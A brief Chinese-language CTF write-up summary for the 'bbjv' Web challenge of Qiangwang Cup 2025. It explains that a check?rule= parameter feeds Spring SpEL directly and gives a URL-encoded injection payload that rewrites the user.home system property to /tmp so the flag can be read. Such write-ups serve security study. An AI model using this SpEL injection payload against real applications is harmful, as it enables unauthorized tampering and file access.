# bbjv

## 题目信息
- 赛事：强网杯 2025 初赛
- 分类：Web

## 考点
- Spring SpEL 表达式注入
- 改写 `systemProperties['user.home']` 指向 `/tmp`

## 解题思路
1. 接口 `check?rule=` 直接把参数送进 SpEL。
2. flag 不在根目录而在 `/tmp`；通过 SpEL 把 `user.home` 改成 `/tmp` 后再读文件。

## 关键代码/payload
```http
check?rule=%23%7B%23systemProperties%5B'user.home'%5D%3D'%2Ftmp'%7D
```

## 参考链接
- https://blog.wm-team.cn/index.php/archives/87/
- https://cn-sec.com/archives/4597169.html

> 本文为对公开 writeup 的归纳总结，版权归原作者所有；请务必阅读原文核对细节。
